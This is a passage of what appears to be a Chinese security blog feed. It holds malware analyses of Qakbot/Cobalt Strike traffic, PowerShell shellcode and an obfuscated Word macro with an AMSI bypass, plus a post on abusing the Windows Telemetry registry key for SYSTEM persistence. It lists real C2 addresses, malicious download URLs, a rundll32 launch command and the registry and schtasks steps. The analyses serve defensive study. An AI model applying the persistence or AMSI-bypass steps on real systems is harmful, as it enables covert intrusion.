        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/ADD7AE0A77B70E8E2CC557DFCE6DA554.jpg" alt="enter description here"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>1.最近对流量分析这一块比较感兴趣，突然想研究研究，所以我找了一个今年12月份在Brad在博客上发布的由Qakbot造成的垃圾邮件感染的cs木马</p><p>2.brad对pcap包的说明：首先第一个pcap包为windows主机感染后的流量，第二个pcap包为新的windows主机感染qbot初期.</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-1.png" alt="1"></p><h3 id="QBOT介绍"><a href="#QBOT介绍" class="headerlink" title="QBOT介绍"></a>QBOT介绍</h3><p>Qakbot&#x2F;Qot通常是通过恶意垃圾邮件（malspam）分发的，但最近在2019年11月也通过漏洞利用工具包进行分发。在某些情况下，Qakbot是由Emotet之类的其他恶意软件引起的后续感染</p><h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h2><h3 id="2-1发现邮件"><a href="#2-1发现邮件" class="headerlink" title="2.1发现邮件"></a>2.1发现邮件</h3><p>首先我们来看第一个pcap包</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-2.png" alt="1"></p><p>受Qakbot感染的主机的pcap还具有与电子邮件相关的TCP流量，该TCP流量到各种端口的各种端口，例如SMTP，IMAP和POP3。要了解这种与网络无关的流量，请使用以下Wireshark过滤器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp or imap or pop</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-3.png" alt="3"></p><p>通常我们不会看到这种从Windows客户端到公共IP地址的未加密电子邮件流量。连同其他一起，<strong>因此使用smtp or imap or pop过滤器可能会显示Qakbot活动</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-4.png" alt="4"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-5.png" alt="5"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-6.png" alt="6"></p><p>这里导出邮件，一共有7封邮件，每一个邮件里面都一个zip压缩包。下图为提取后为下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-7.png" alt="7"></p><p>同时压缩包全部解压文件后整理，为下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-8.png" alt="8"></p><h3 id="2-2分析Excel"><a href="#2-2分析Excel" class="headerlink" title="2.2分析Excel"></a>2.2分析Excel</h3><p>这里我们使用oletools套件的olevba和olebrowse分析Excel表格是否带有恶意的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-9.png" alt="9"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-12.png" alt="12"></p><p>我们可以看到使用U<em>RLDownloadToFile</em> 下从url下载了什么</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-13.png" alt="13"></p><p>同时使用 rundll32 运行了 .\appdata\kipofe.mmaallaauu 文件</p><h3 id="2-3抓捕流量"><a href="#2-3抓捕流量" class="headerlink" title="2.3抓捕流量"></a>2.3抓捕流量</h3><p>我们直接运行Excel表格，并打开wireshark和火绒剑进行监听。火绒剑我们这里就锁定进程rundll32即可。当我们运行了宏之后，在下图我们发现了103.50.160.62 （www。pharmainstruelec.com&#x2F;nezlzltik&#x2F;590906.jpg）获取这个jpg文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-10.png" alt="10"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-11.png" alt="11"></p><p>那么我们可以在第二个流量包找到类似相关qbot感染的活动路径</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-14.png" alt="14"></p><p>这里我们可以看到第二个流量包的数据 是mz开头的，一般mz开头不是exe就是dll 的文件。</p><p>那么剩下的几个Excel表格也是同样的分析。</p><p>样本整理后如下所示：</p><p><strong>压缩包文件</strong></p><table><thead><tr><th>SHA256</th><th>压缩包&#x2F;zip</th></tr></thead><tbody><tr><td>368e6de4bf4afecaa94be1c692adb75c27fad03d476bbcc2ac1ba6d3c72c7769</td><td>121154729-12072020.zip</td></tr><tr><td>e0fbf32c49dec4fd4556585d12a1f680beac60fcc4c7c975532192a2f5205468</td><td>21235375580-12072020.zip</td></tr><tr><td>3152420926e341d162c7932ee2720936db61878203f328df73d91feea4e8f988</td><td>2069264980-12072020.zip</td></tr><tr><td>d5977da587fb0e9ca77022e4db296daeca48479f9084c69dd753c3cb975c9770</td><td>32099437590-12072020.zip</td></tr><tr><td>e47404434669d3fe1d5617059fc1910b61a9aa39bc8e7d511989cb2df434358a</td><td>344492468-12072020.zip</td></tr><tr><td>329c2c596eb34ce97311dd1632d68f367351a4f8fa36d3000663c06aaaaf8be9</td><td>348173587-12072020.zip</td></tr><tr><td>ac82da8389a6f18b0658bc7a81f81e4b77a6e0ad890177f75f8d7c4a8b5b98fb</td><td>454409333-12072020.zip</td></tr></tbody></table><p><strong>从zip解压的Excel表格文件</strong></p><table><thead><tr><th>SHA256</th><th>Excel</th></tr></thead><tbody><tr><td>c7a23d2fbf73b3518e75a0a4f575f0420022db66eda48e165e31f730957f85af</td><td>121154729-12072020.xls</td></tr><tr><td>7d8fcca8451697ce3b69d3cc3907220537d9dde13ba3b12f6ae1521ab71122d1</td><td>21235375580-12072020.xls</td></tr><tr><td>c8c0674ece031e44bef02d2867980c02a7696041fe92ae05e004d7cd5d0cfd0c</td><td>32069264980-12072020.xls</td></tr><tr><td>38e12cb936dc2f1c8ae6ee8c2bd12c95a8bf26bc94b1b360e48458d619cad453</td><td>32099437590-12072020.xls</td></tr><tr><td>aff3fa3eeb5c3344b890953c6f932dd5ae4fc777a968d795b92651f75e0032df</td><td>344492468-12072020.xls</td></tr><tr><td>c641038179d8c7e53976eb8e2254b0210877a453c2ea10d54da5d015e23fddd3</td><td>348173587-12072020.xls</td></tr><tr><td>ed765542bc939d7e6cd87a616194919fbbde177caf0af4654ab3fd1675cdc24e</td><td>454409333-12072020.xls</td></tr></tbody></table><p><strong>Excel启用宏后生成的URL链接</strong></p><table><thead><tr><th>IP地址</th><th>端口</th><th>域名</th><th>url</th></tr></thead><tbody><tr><td>103.50.160.62</td><td>80</td><td><a href="http://www.pharmainstruelec.com/">www.pharmainstruelec。com</a></td><td>GET &#x2F;nezlzltik&#x2F;590906.jpg</td></tr><tr><td>35.208.103.169</td><td>80</td><td>hthwineandwood。com</td><td>GET &#x2F;niuikjzikf&#x2F;590906.jpg</td></tr><tr><td>35.214.219.237</td><td>80</td><td>norkupong。com</td><td>GET &#x2F;ljapekfahlob&#x2F;590906.jpg</td></tr><tr><td>35.214.136.217</td><td>80</td><td>raformatico。com</td><td>GET &#x2F;mjbgpabrmph&#x2F;590906.jpg</td></tr></tbody></table><p><strong>Excel下载后的DLL文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SHA256 hash: adaf53df8472ef0698b77be7b321334912e7c84f669ace078c342147555ea24f</span><br><span class="line">文件大小: 2,130,128 bytes</span><br><span class="line">文件web获取地址: www。pharmainstruelec.com/nezlzltik/590906.jpg</span><br><span class="line">文件保存路径: C:\Users\[username]\AppData\Kipofe.mmaallaauu</span><br><span class="line">文件描述: DLL file for Qakbot retrieved by macro from 454409333-12072020.xls</span><br><span class="line">运行命令: Rundll32.exe [filename],DllRegisterServer</span><br></pre></td></tr></table></figure><h3 id="2-4QAKBOT-活动路径"><a href="#2-4QAKBOT-活动路径" class="headerlink" title="2.4QAKBOT 活动路径"></a>2.4QAKBOT 活动路径</h3><p>让我们回到第一个流量包,当我们使用过滤器过滤掉 http&#x2F;http以及ssdp，我们不难发现 qbot的活动轨迹</p><p>在这里我们可以看到45.63.107。192 port 995 -Qakbot C2 来自https。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-15.png" alt="15"></p><p>那么我们跟踪下查看下该证书的内容，可以看到下图所示的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-22.png" alt="22"></p><p>以及由Qakbot引起的连接检查 www。openssl。org<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-21.png" alt="21"></p><p>同时我们可以看到比较熟悉的地址 api.ipify。org 这个地址通常是为了检查IP的才使用的。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-19.png" alt="19"></p><p>以及这里作者提到的 Qakbot tcp感染54.36.108.120 port 65400 </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-20.png" alt="20"></p><p>这里可以看到由api.ipify。org 对IP的检测</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-23.png" alt="20"></p><h3 id="2-5-COBALT-STRIKE的活动路径"><a href="#2-5-COBALT-STRIKE的活动路径" class="headerlink" title="2.5 COBALT STRIKE的活动路径"></a>2.5 COBALT STRIKE的活动路径</h3><p>在这段我们可以看到cs的https连接</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-25.png" alt="25"></p><p>以及它的证书</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-24.png" alt="24"></p><p>在这里我们对amajai-technologies.work&#x2F;GSMu http流追踪</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-26.png" alt="26"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-18.png" alt="18"></p><p>我们这里索性把它dump下来，进行分析</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-16.png" alt="16"></p><p>在这里我们对其进行反汇编，可以见到比较熟悉的开头 ‘FCE8’，不难猜测可能是 COBALT STRIKE 的payload。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201222-17.png" alt="17"></p><p>由此我们可以判定 COBALT STRIKE 为https的分阶段式payload。</p><p><strong>QABKOT感染的路径</strong></p><table><thead><tr><th>IP地址</th><th>端口</th><th>域名</th><th>描述</th></tr></thead><tbody><tr><td>45.63.107.192</td><td>955</td><td></td><td>HTTPS  Qakbot C2</td></tr><tr><td>54.36.108.120</td><td>65400</td><td></td><td>Qakbot tcp感染路径</td></tr><tr><td>23.21.126.66</td><td>443</td><td>api.ipify。org</td><td>qbot的IP检查</td></tr><tr><td></td><td>443</td><td><a href="http://www.openssl.org/">www.openssl。org</a></td><td>由Qbot引起的连接检查</td></tr></tbody></table><p><strong>COBALT STRIKE的活动路径</strong></p><table><thead><tr><th>IP地址</th><th>端口</th><th>域名</th><th>描述</th></tr></thead><tbody><tr><td>23.106.160.138</td><td>8888</td><td>amajai-technologies.world</td><td>cs的https连接</td></tr><tr><td>23.106.160.137</td><td>80</td><td>amajai-technologies.work</td><td>GET &#x2F;GSMu  获得payload</td></tr><tr><td>23.106.160.137</td><td>80</td><td>amajai-technologies.work</td><td>GET &#x2F;IE9CompatViewList.xml  执行命令</td></tr></tbody></table><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://www.malware-traffic-analysis.net/2020/12/07/index.html">https://www.malware-traffic-analysis.net/2020/12/07/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell shellcode 样本分析</title>
      <link href="/powershell%20shellcode%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
      <url>/powershell%20shellcode%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BDC93AC118C9144F16783F634F3C4F1B.jpg" alt="222"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>前段时间找了一些样本分析的工具，有时候用起来不是很顺手，当我找到PCsXcetra发布的工具时，感觉比较顺手些。</p><p>我在GitHub上同时也找到了PCsXcetra对使用他的工具对样本的分析是如何事半功倍的。</p><p>本文将大体讲述相关样本分析工具而本文使用到的工具均为PCsXcetra的所在Derbycon 2019大会发布的相关工具。</p><p><a href="https://github.com/PCsXcetra/DerbyCon-2019Files">https://github.com/PCsXcetra/DerbyCon-2019Files</a></p><p>接下来让我们看看PCsXcetra他是如何分析和合理使用他的工具的。</p><h2 id="2-样本1"><a href="#2-样本1" class="headerlink" title="2.样本1"></a>2.样本1</h2><p>接下来我们看一下这个样本在2018年11月份的powershell样本。首先我们可以清楚的看到整段代码为powershell 解码base64执行。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-1.png" alt="1"></p><p>解码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-2.png" alt="2"></p><p>代码整理后发现有一段还是有base64字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-3.png" alt="3"></p><p>之后，我们得到一个Powershell脚本Gzip流。解压缩后，我们看到了这一点。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-4.png" alt="4"></p><p>代码整理后，以及看到base64代码段。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-5.png" alt="5"></p><p>在这里，我们看到一个base64编码的字符串。这是我们编码的shellcode。它将被加载到虚拟内存中并运行。确切的实现可能会有所不同，但这是我最常看到的。</p><p>那把我们带到了我们想要的shellcode。现在我们可以将base64解码为十六进制。</p><p>使用PCsXcetra的 base64encode 转换。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-8.png" alt="8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-7.png" alt="7"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-6.png" alt="6"></p><p>这里发现没有任何信息。</p><p>尝试CyberChef 并查看程序集</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-12.png" alt="12"></p><p>好吧，这似乎也没有太大帮助。</p><p>那么现在怎么办。</p><p>新工具。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-9.png" alt="9"></p><p>这里选择hex ，得到信息为  一个IP地址和端口</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-10.png" alt="10"></p><p>同样我们这里可以使用选择bas64选项，得出来的结果和上面一样</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-11.png" alt="11"></p><h2 id="3-样本2"><a href="#3-样本2" class="headerlink" title="3.样本2"></a>3.样本2</h2><p>该样本在最初是由Paul Melson（PaulM @pmelson）ScumBots @ScumBots机器人在pastebin上发现的，并上传到Virus Total。</p><p>当我们第一次查看此脚本时，我们会注意到的是，它以一个非常大base64字符串。第二件事是将它与字符串“ +”分开，以使自动base64解码器混乱，后者无法处理将字符串放回并先删除它们的情况。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-13.png" alt="13"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-14.png" alt="14"></p><p>清理完base64字符串并进行base64解码后，我们看到了这一点。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-15.png" alt="15"></p><p>我们可以看到其中嵌入了base64编码的可执行文件。让我们先提取并快速浏览一下。</p><p>看来脚本将加载此Dll，这是AMSI Bypass方法，然后将加载shellcode。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-16.png" alt="16"></p><p>现在，让我们仔细看看这个shellcode。它不是以常规的“ 0xFC”开头。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-17.png" alt="17"></p><p>这很难看懂，其中发生了什么，那么我们用一款格式化工具看看，所以让我们对其进行一些格式化以更好地去查看代码。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-18.png" alt="18"></p><p>我们可以看到该shellcode已被拆分为多个数组，如图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-19.png" alt="19"></p><p>并将在运行时重新组合shellcode。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-20.png" alt="20"></p><p>现在已经重新组合好shellcode了，我们现在可以将其输入到我们的工具中以获取IP&#x2F;URL。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-21.png" alt="21"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201110-22.png" alt="22"></p><p>还有API调用。因此它也将帮助您更深入地了解调用的内容，从而可能有助于更好地了解其功能，而不仅仅是在沙盒中运行可能显示的IP或Url。</p><p>参考链接：</p><p><a href="https://pcsxcetrasupport3.wordpress.com/2019/07/07/those-pesky-powershell-shellcodes-and-how-to-understand-them/">https://pcsxcetrasupport3.wordpress.com/2019/07/07/those-pesky-powershell-shellcodes-and-how-to-understand-them/</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Word宏样本分析</title>
      <link href="/%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
      <url>/%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-20.jpg" alt="20"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>前段时间看到了一个非常有意思的宏病毒样本分析，决定与各位一起分析一下。</p><p>迄今为止，VBA宏仍然是最流行的攻击媒介之一。本文分析多层混淆的VBA宏，其中包括VBA，WMI对象，Powershell，内联C＃和BYPASS AMSI。</p><h2 id="2-初步分析"><a href="#2-初步分析" class="headerlink" title="2.初步分析"></a>2.初步分析</h2><p>我们首先在十六进制编辑器中检查.DOC。我们可以看到标头以PK开头，表示此类型的文件是ZIP。现代Microsoft Word文档实际上是ZIP文件，如果将文档从.DOC重命名为.ZIP，则可以解压缩内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-18.png" alt="18"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-19.png" alt="19"></p><p>我们首先需要提权文档的vba宏，使用olevba即可提取。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-1.png" alt="1"></p><p>经过提取下面的宏 我们发现可以看到VBA代码的格式不正确（很可能是故意的）。因此，我们需要通过替换多余的换行符（“ \ n”），制表符（“ \ t”）和空格（“ \ s”）来对其进行清理，直到获得正确格式的VBA代码为止。这不是运行代码所必需的，但是，如果要在Microsoft Word的开发人员工具中对其进行调试，则需要多行代码才能放置断点。</p><p>经过代码整理，格式化后我们就可以看到以下的内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-2.png" alt="2"></p><p>我们可以看到以上代码基本都是经过混淆的代码，让我们在Microsoft Word中打开文档。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-4.png" alt="4"></p><p>复制替换为我们之前整理的代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-5.png" alt="5"></p><p>同时我们也可以到自动执行的函数的位置。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-3.png" alt="3"></p><p>在VBA代码或文档内容，属性或设置中不容易看到&#x2F;显示。我们首先在“ Sub Document_Open()”函数中放置一个断点。此功能是在打开Word文档时运行的功能。然后，我们运行将在断点处中断的脚本。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-7.png" alt="7"></p><p>这两个变量将被读入VBA脚本并进行解码。这是隐藏此脚本功能的地方。第一个变量被解码为WMI对象”winmgmts:\.\root\cimv2:Win32_Process”，该对象负责启动第二个变量的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-8.png" alt="8"></p><p>第二个变量被解码Powershell。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-9.png" alt="9"></p><p>如果我们继续运行脚本，它将最终启动Powershell终端，并使用变量2中的解码脚本。在Powershell启动时，我们可以在系统日志中查看该脚本的内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-6.png" alt="6"></p><h2 id="3-powershell混淆"><a href="#3-powershell混淆" class="headerlink" title="3.powershell混淆"></a>3.powershell混淆</h2><p>依旧是代码混淆，现在我们已经提取了Powershell，我们可以再次清理一下代码，并通过替换“;”将其分成适当的行。用“; \ n”并固定行距。 </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-10.png" alt="10"></p><p>Powershell脚本非常简单。从清理后的代码中，我们可以在顶部看到一个去模糊函数，该函数负责解码中间变量中的文本斑点。我们还在脚本的底部看到一个“ Add-Type”行，该行正在调用“ c193b()”函数。这通常用于以与Powershell不同的编程语言来内联脚本。在这种情况下，我们看到脚本已解码了C＃代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-11.png" alt="11"></p><h2 id="4-C-混淆"><a href="#4-C-混淆" class="headerlink" title="4. C#混淆"></a>4. C#混淆</h2><p>到目前为止，我们已经做到了。我们已经运行了启用VBA的Word文档，让它将隐藏的变量解码为通过WMI对象启动的混淆的Powershell，并且对混淆的Powershell进行了查找以找到内联的C＃。我们快完成了。我们可以再次清理反混淆的代码，以便可以将其加载到适当的IDE中并进行调试。在这种情况下，我们拥有C＃，因此我们可以在Visual Studio中启动一个新的C＃项目，并将代码粘贴到“ Hello World”函数之后，如下所示。我们需要将“ using”语句放在顶部，然后将我们混淆处理的“ public class”代码粘贴到main函数下面。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-12.png" alt="12"></p><p>从我们的Powershell脚本中，我们看到它正在函数“ c193b()”处调用“ yba2983”类。因此，我们需要将其放置在程序“ Main”中，以便模仿Powershell的切换。确保在“ c193b”函数中放置一个断点，以便可以逐步完成它。</p><h2 id="5-BYPASS-AMSI"><a href="#5-BYPASS-AMSI" class="headerlink" title="5.BYPASS AMSI"></a>5.BYPASS AMSI</h2><p>防恶意软件扫描接口（AMSI）是更高版本的Microsoft Windows附带的系统保护，可帮助防御这些类型的攻击。Microsoft将AMSI描述为：</p><blockquote><p>Windows反恶意软件扫描接口（AMSI）是一种通用接口标准，允许您的应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI为您的最终用户及其数据，应用程序和工作负载提供了增强的恶意软件防护。</p></blockquote><p>简单来说，“ amsi.dll”在系统上运行，并通过AmsiScanBuffer API强制所有脚本输出。因此，我们将在AmsiScanBuffer接口中检查我们发现的所有模糊文本，以进行可疑&#x2F;恶意操作。如果找到任何内容，AMSI将拒绝执行脚本。有保护的地方就有旁路，这正是我们在C＃代码开头找到的内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-13.png" alt="13"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-14.png" alt="14"></p><p>这个特殊的<strong>bypass</strong>尝试使用<strong>“ amsi.dll”</strong>作为目标来调用“ loadlibrary”。如果成功，则表明系统上存在AMSI。接下来，代码将为AmsiScanBuffer接口调用“ GetProcAddress”，通过调用“ VirtualProtect”来取消保护其内存区域，然后通过对“ RtlMoveMemory”的调用有选择地修补“ amsi.dll”。通过修补“ amsi.dll”，他们删除了阻止脚本运行的保护性检查。 </p><h2 id="6-终止"><a href="#6-终止" class="headerlink" title="6.终止"></a>6.终止</h2><p>如果我们继续调试C＃代码，我们最终将对最终变量进行模糊处理，并显示预期下载的URL。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-15.png" alt="15"></p><p><strong>由于服务器关闭并没有接下去进行分析</strong>，代码将创建一个新的WebClient连接，将可执行文件下载到一个临时空间中，并启动该过程。该恶意软件的第二阶段可能是远程访问特洛伊木马（RAT），银行恶意软件，勒索软件等。但是，本文的目的是演示如何分析第一阶段，而不遵循第二阶段的下载。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201030-16.png" alt="16"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/120201030-17.png" alt="17"></p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>样本下载地址<a href="https://app.any.run/tasks/cca3277b-8f2d-43c4-9006-457af9be1883/">https://app.any.run/tasks/cca3277b-8f2d-43c4-9006-457af9be1883/</a></p><p>文章参考：<a href="https://www.ringzerolabs.com/2020/10/obfuscated-vba-powershell-c.html">https://www.ringzerolabs.com/2020/10/obfuscated-vba-powershell-c.html</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>滥用WINDOWS TELEMETRY以实现持久化并提权</title>
      <link href="/%E6%BB%A5%E7%94%A8WINDOWS%20TELEMETRY%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%B9%B6%E6%8F%90%E6%9D%83.html"/>
      <url>/%E6%BB%A5%E7%94%A8WINDOWS%20TELEMETRY%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%B9%B6%E6%8F%90%E6%9D%83.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-4.png" alt="Paschen1"></p><span id="more"></span><p>今天，我们将讨论一种持久化方法是由trustedsec的christopher-paschen发布的文章，该方法利用了微软过去十年在Windows版本中包含的一些出色的遥测技术。此处概述的过程会影响从2008R2&#x2F;Windows 7到2019&#x2F;Windows 10的Win系统。</p><p>此持久化技术需要安装本地管理员权限（要求具有写入注册表HKLM的能力），并且在自动运行中不可见。</p><p><strong>你需要知道的事情：</strong></p><ul><li>网络正常</li><li>将键值添加到<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController</strong></li><li>在此新键值内，创建Reg_SZ值 <strong>Command</strong>，并将其数据值设置为你要启动的**.exe**文件。</li><li>创建用于维护，每天晚上，Oobe的DWORD密钥，并将它们全部设置为一个（仅每24小时运行一次每夜一次）</li><li>使用持久化，它应该从Windows计划任务定期运行</li><li>您可以使用<strong>schtasks &#x2F;run &#x2F;tn “\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser”</strong> 进行测试，也可以通过在任务计划程序中手动启动任务来进行测试。</li></ul><p>下面为示例，运行计划任务时，这些注册表添加项将作为系统启动notepad.exe。</p><p><strong>server 2008 R2</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-4.png" alt="Paschen1"></p><p>让我们深入研究正在发生的事情以及为什么这会在系统级别启动您的任务。首先，<strong>c:\windows \ system32\CompatTelRunner.exe</strong>似乎是二进制文件，<strong>旨在运行各种遥测任务</strong>。二进制本身本身并不会收集太多数据。CompatTelRunner似乎正在检查一些系统统计信息，以确保已连接网络，然后运行各种命令来执行实际的遥测收集。将此视为遥测管理器。</p><p>当<strong>CompatTelRunner.exe</strong>运行时（到2020年5月为当前版本），它会先检查是否满足一些条件，然后继续进行遥测任务。</p><p><strong>Win10 POC 测试</strong></p><p><strong>1.添加注册表键值</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-1.png" alt="1"></p><p><strong>2.添加计划任务</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-6.png" alt="6"></p><p>在win10看到的结果</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-1.jpg" alt="1"></p><p><strong>Win7 也是同样 的方式 测试</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-2.png" alt="2"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-3.png" alt="3"></p><p><strong>最后加载恶意的exp，进行使用cobaltstrike 进行测试</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-5.png" alt="5"></p><h2 id="防御加固策略"><a href="#防御加固策略" class="headerlink" title="防御加固策略"></a>防御加固策略</h2><p>将<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AppCompatFlags\TelemetryController</strong>的键值Sku和Nightly 设置为0</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201015-7.png" alt="7"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/?utm_content=131234033">https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/?utm_content=131234033</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
